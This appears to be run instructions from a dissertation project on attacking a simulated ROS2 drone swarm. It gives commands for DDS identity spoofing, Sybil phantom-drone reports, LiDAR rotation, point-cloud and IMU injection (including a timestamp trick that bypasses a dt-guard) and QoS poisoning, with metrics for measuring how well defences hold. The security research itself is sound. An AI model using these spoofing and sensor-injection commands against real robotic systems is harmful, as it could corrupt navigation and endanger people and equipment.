# Attacks — Run Instructions

Assumes [SETUP.md](SETUP.md) is complete and the stack is launched per [LAUNCH.md](LAUNCH.md). All attacks operate under the attacker model of a network participant that can publish/subscribe to any DDS topic (SROS2 disabled), but cannot intercept, modify, or reconfigure victim systems.

## Layer 1 — Coordination Protocol Attacks

The `network_attacker` node implements three Layer 1 attack modes against `/swarm/waypoint_status`. Common parameters: `attack`, `target_drone`, `discovery_time`, `spoof_delay`.

### Coverage Spoof

Single-identity attack: the attacker spoofs an existing drone's identity and broadcasts completion reports for waypoints across both zones.

```bash
source /opt/ros/humble/setup.bash
source ~/ros2_ws/install/setup.bash

python3 ~/ros2_ws/src/swarm_mission/swarm_mission/network_attacker.py --ros-args \
  -p attack:=coverage_spoof \
  -p target_drone:=drone2 \
  -p discovery_time:=5.0 \
  -p spoof_delay:=0.5
```

### Phantom Drone (Sybil)

Introduces a non-existent drone identity (drone3) and broadcasts completion reports under that identity.

```bash
python3 ~/ros2_ws/src/swarm_mission/swarm_mission/network_attacker.py --ros-args \
  -p attack:=phantom_drone \
  -p target_drone:=drone2 \
  -p discovery_time:=5.0 \
  -p spoof_delay:=0.5
```

### Selective Denial

Alternates between impersonating each real drone, spoofing each one with reports about its own assigned territory.

```bash
python3 ~/ros2_ws/src/swarm_mission/swarm_mission/network_attacker.py --ros-args \
  -p attack:=selective_denial \
  -p target_drone:=drone2 \
  -p discovery_time:=5.0 \
  -p spoof_delay:=0.5
```

### Cooperative Inspection Mission (Layer 1 baseline + Byzantine)

Layer 1 attacks need an active mission against which to measure. Run the cooperative inspection mission for the baseline and Byzantine-insider comparisons.

#### Honest scenario (baseline)

```bash
# Terminal A — Drone 1 navigator
source ~/ros2_ws/install/setup.bash
ros2 run swarm_mission waypoint_navigator --ros-args \
  -p drone_id:=drone1 -p byzantine:=false \
  -p spawn_x:=-6.0 -p spawn_y:=0.0 \
  -p config_file:=$HOME/ros2_ws/src/swarm_mission/config/waypoints.yaml

# Terminal B — Drone 2 navigator
source ~/ros2_ws/install/setup.bash
ros2 run swarm_mission waypoint_navigator --ros-args \
  -p drone_id:=drone2 -p byzantine:=false \
  -p spawn_x:=-3.0 -p spawn_y:=0.0 \
  -p config_file:=$HOME/ros2_ws/src/swarm_mission/config/waypoints.yaml

# Terminal C — Ground truth logger
source ~/ros2_ws/install/setup.bash
ros2 run swarm_mission ground_truth_logger --ros-args \
  -p config_file:=$HOME/ros2_ws/src/swarm_mission/config/waypoints.yaml
```

#### Byzantine scenario (drone 2 lies)

Same as above but change drone 2's terminal to:

```bash
ros2 run swarm_mission waypoint_navigator --ros-args \
  -p drone_id:=drone2 -p byzantine:=true \
  -p spawn_x:=-3.0 -p spawn_y:=0.0 \
  -p config_file:=$HOME/ros2_ws/src/swarm_mission/config/waypoints.yaml
```

In Byzantine mode, drone 2 immediately reports all its assigned waypoints as visited without flying to them. The ground truth logger records the gap.

#### Key technical notes

- **Setpoint rate:** ArduCopter GUIDED mode requires continuous setpoints at ≥10 Hz. The navigator uses a 20 Hz timer.
- **Position source:** Navigator reads from MAVROS `local_position/pose` (EKF output frame), NOT LIO-SAM odometry, ensuring setpoints and position readings are in the same frame.
- **Coordinate conversion:** Waypoints in `config/waypoints.yaml` are in Gazebo world coordinates. The navigator converts them to MAVROS local frame using spawn position offsets: `local = world − spawn`.
- **Spawn positions:** Drone 1 spawns at (−6, 0), drone 2 at (−3, 0). Pass these as parameters.
- **No use_sim_time:** Do NOT pass `use_sim_time:=true` to the navigator nodes — it throttles the 20 Hz setpoint timer and ArduCopter stops responding.

#### Waypoint configuration

`config/waypoints.yaml` uses 18 waypoints (9 per drone) with zones split along the x-axis:

- **Drone 1 (IDs 0–8):** Open area, world x = −8 to −13
- **Drone 2 (IDs 9–17):** Shelving area, world x = 1 to 9

Reminder: `local = world − spawn`.

---

## Layer 2 — Navigation Pipeline Attacks

### Scan Manipulation — Gradual Rotation

Rotates LiDAR points by a ramping angle around Z and republishes on the same topic. Used in the rotation-rate sweep experiment.

#### Single trial

```bash
source ~/ros2_ws/install/setup.bash
ros2 run swarm_mission lidar_manipulator --ros-args \
  -p target_drone:=drone1 \
  -p rotation_rate_dps:=1.0 \
  -p translation_rate_mps:=0.05
```

#### Automated sweep (with TTF logging)

```bash
./scripts/sweep_runner.sh <rotation_rate_dps> <run_number>
# example
./scripts/sweep_runner.sh 1.0 1
```

The runner spawns the `slam_failure_logger` alongside the manipulator, records the TTF on the `Waiting for IMU data` sustained-loop pattern, and writes a row to `~/results/scan_sweep/summary.csv`. Pre-flight checks for zombie processes before starting.

### Scan Manipulation — Spoof Delay Sweep

Run coverage_spoof at varying injection delays for the Section 3.4.1 rate-sensitivity finding:

```bash
for delay in 0.1 0.5 1.0 2.0 5.0; do
    python3 ~/ros2_ws/src/swarm_mission/swarm_mission/network_attacker.py --ros-args \
        -p attack:=coverage_spoof \
        -p target_drone:=drone2 \
        -p discovery_time:=5.0 \
        -p spoof_delay:=$delay
    # Wait for ground_truth_logger to write the summary row,
    # restart drones, then continue to next delay
done
```

### Point Cloud Injection

Injects a phantom wall into LIO-SAM's point cloud map. Negative-result attack: appears in map but does not affect odometry due to ICP robustness.

```bash
source ~/ros2_ws/install/setup.bash
ros2 run swarm_mission pointcloud_injector --ros-args \
  -p target_drone:=drone1 \
  -p wall_x:=-10.0 \
  -p wall_y_min:=-5.0 -p wall_y_max:=3.0 \
  -p wall_z_min:=0.0  -p wall_z_max:=3.5 \
  -p spawn_x:=-6.0 -p spawn_y:=0.0 \
  -p point_spacing:=0.15
```

**Parameters:**

| Parameter | Default | Purpose |
|-----------|---------|---------|
| target_drone | drone1 | Which drone to attack |
| wall_x | -10.0 | World X coordinate of the wall plane |
| wall_y_min/max | -5.0 / 3.0 | Wall extent in Y |
| wall_z_min/max | 0.0 / 3.5 | Wall extent in Z |
| point_spacing | 0.15 | Metres between injected points |
| spawn_x/y | -6.0 / 0.0 | Target drone's spawn position |
| noise_sigma | 0.02 | Gaussian noise for realism |
| injection_rate | 2.0 | Scans per second |

### IMU Data Injection

Two variants of this attack target `/droneN/imu/data`. LIO-SAM subscribes to this topic directly (the Gazebo-side stream, not MAVROS), so any DDS publisher with topic access can inject alongside the real sensor.

#### Original — reused-timestamp variant (negative result)

```bash
ros2 run swarm_mission imu_injector --ros-args \
  -p target_drone:=drone1 \
  -p mode:=spike \
  -p injection_rate:=500.0 \
  -p attack_duration:=30.0
```

Blocked by LIO-SAM's `dt > 0` guard (see `lio_sam_patches/imu_preintegration_dt_guards.patch`).

> **Defense attribution caveat:** the blocking guard is a custom patch added to LIO-SAM during this work, not an upstream defence. The `imu_injector_v2` variant tests this attribution.

#### Advancing-timestamp bypass

Same payload modes (`bias`, `spike`, `flip`) but each injected message carries a fresh sim-time timestamp from `rclpy.Clock.now()` — bypasses the dt-guard. Also subscribes to LIO-SAM's odometry topic during the trial and records pose drift in the per-second metric row.

```bash
ros2 run swarm_mission imu_injector_v2 --ros-args \
  -p target_drone:=drone1 \
  -p mode:=bias \
  -p accel_bias_x:=5.0 \
  -p injection_rate:=500.0 \
  -p baseline_duration:=15.0 \
  -p attack_duration:=45.0 \
  -p recovery_duration:=15.0
```

**Parameters:**

| Parameter | Default | Purpose |
|-----------|---------|---------|
| target_drone | drone1 | Which drone to attack |
| mode | bias | `bias` (constant accel offset), `spike` (large impulse), `flip` (invert gravity) |
| accel_bias_x/y/z | 5.0/0/0 | Constant accel bias (m/s²) for `bias` mode |
| spike_magnitude | 30.0 | Spike acceleration (m/s²) for `spike` mode |
| spike_axis | z | Axis for `spike` mode (`x`/`y`/`z`) |
| injection_rate | 500.0 | Hz — match or exceed real IMU rate |
| baseline_duration | 15.0 | Seconds of pre-attack measurement |
| attack_duration | 45.0 | Seconds with injection active |
| recovery_duration | 15.0 | Seconds of post-attack measurement |

#### Verdict matrix (printed at trial end)

| LIO-SAM drift (m) | Drone drift (m) | Interpretation |
|------------------:|----------------:|---|
| < 1.0 | < 1.0 | dt-guard wasn't the only defence — LIO-SAM-internal velocity guard or factor-graph constraint intercepts |
| > 1.0 | < 1.0 | LIO-SAM corrupted; EKF3 innovation gate caught the bad vision_pose |
| > 1.0 | > 1.0 | Both layers failed — full attack success, dt-guard reclassified as insufficient |

Output CSV: `~/imu_injection_v2_metrics_<drone>_<timestamp>.csv` with columns `timestamp, phase, phase_elapsed_s, inject_count, drone_drift_m, lio_sam_drift_m, drone_x/y/z, lio_x/y/z`.

### QoS Profile Poisoning

Creates RELIABLE subscribers on LIO-SAM's BEST_EFFORT odometry topic, forcing the DDS middleware to satisfy the stricter QoS policy. Causes odometry output rate to degrade.

```bash
source ~/ros2_ws/install/setup.bash
ros2 run swarm_mission qos_poisoner --ros-args \
  -p target_drone:=drone1 \
  -p baseline_duration:=15.0 \
  -p attack_duration:=45.0 \
  -p recovery_duration:=15.0 \
  -p num_reliable_subs:=5
```

Manual single-command attack (no metrics):

```bash
ros2 topic echo /drone1/lio_sam/mapping/odometry_incremental --qos-reliability reliable
```

Output CSV: `~/qos_attack_metrics_<drone>_<timestamp>.csv`.

---

## Trial Protocol Recommendations

For all Layer 2 trials:

1. **Use GPS-hold position** (`VISO_TYPE=0`, `GPS1_TYPE=1`) to isolate the attack's effect on the SLAM pipeline from EKF3 feedback dynamics. The dissertation methodology section explains why.
2. **Cold restart LIO-SAM between trials** — the factor graph and accumulated map carry corruption from prior trials. The `state_audit.sh` script catalogues lingering state if cleanups appear incomplete.
3. **Run pre-flight check before each trial** (see `scripts/preflight_check.sh`).
4. **For statistically meaningful results**, run n ≥ 3 trials per condition.

---

For troubleshooting any of the above, see [TROUBLESHOOTING.md](TROUBLESHOOTING.md).
